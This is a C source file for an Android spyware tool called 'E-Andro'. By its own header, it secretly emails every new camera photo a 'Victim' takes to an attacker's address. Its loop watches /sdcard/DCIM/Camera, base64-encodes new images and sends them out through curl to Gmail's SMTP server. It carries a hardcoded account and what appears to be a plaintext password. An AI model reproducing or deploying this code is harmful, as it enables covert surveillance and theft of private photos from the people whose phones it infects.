/***************************************************************************
███████╗     █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ 	@Kumar Raja :)
██╔════╝    ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
█████╗█████╗███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║
██╔══╝╚════╝██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║
███████╗    ██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝
╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
													
This Program Allows you to whenever Victim taken photograph it send mail 
to specific Mail Address.                                                
Root Not Needed.
Watch My Video How to Push and which files we need for this.
any Queries Email-Me At - kisstechno@gmail.com
***************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int email(){
        char k;                                                                                                                                    while(1){
system("if [ ! -f /data/local/tmp/temp1 ] ; then ls /sdcard/DCIM/Camera/*.jpg > /data/local/tmp/temp1 ; ls /sdcard/DCIM/Camera/*.jpg > /data/local/tmp/temp2 ; else ls /sdcard/DCIM/Camera/*.jpg > /data/local/tmp/temp2 ;/data/local/tmp/busybox sort -uo /data/local/tmp/temp1 /data/local/tmp/temp1; fi ");

system("export LD_LIBRARY_PATH=/data/local/tmp/lib64;for i in `fgrep -xvf /data/local/tmp/temp1 /data/local/tmp/temp2 | /data/local/tmp/busybox head -1` ; do  echo -e \"From: 'E-Andro' <E-Andro@gmail.com>\nSubject: IMAGE\nContent-Type: image/jpg; name='IMAGE'\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename='IMAGE'\n\n\" > /data/local/tmp/mail.txt ; /data/local/tmp/busybox base64 $i >> /data/local/tmp/mail.txt ;sleep 5;  /data/local/tmp/curl --url 'smtps://smtp.gmail.com:465' --ssl-reqd --mail-from 'kmaddala@aptroid.com' --mail-rcpt 'kmaddala@aptroid.com' --upload-file /data/local/tmp/mail.txt --user 'kmaddala@aptroid.com:rajKUMAR' --insecure ;sleep 5; echo $i >> /data/local/tmp/temp1; /data/local/tmp/busybox sort -uo /data/local/tmp/temp1 /data/local/tmp/temp1;  done");
//printf("%s",k);
sleep(10);
}

return 1;
}
// ----------------------------------------------------------------------------------------
void usage() { 
printf("███████╗     █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗    @Kumar Raja :)\n"
"██╔════╝    ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗\n"
"█████╗█████╗███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║\n"
"██╔══╝╚════╝██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║\n"
"███████╗    ██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝\n"
"╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ \n\n");
printf("Usage: Just Directly execute the script After changing the MailID and Password\n");
}
int main( int argc, char *argv[] ){
if (argv[1])
{
usage();
}
else
{
email();
}
}
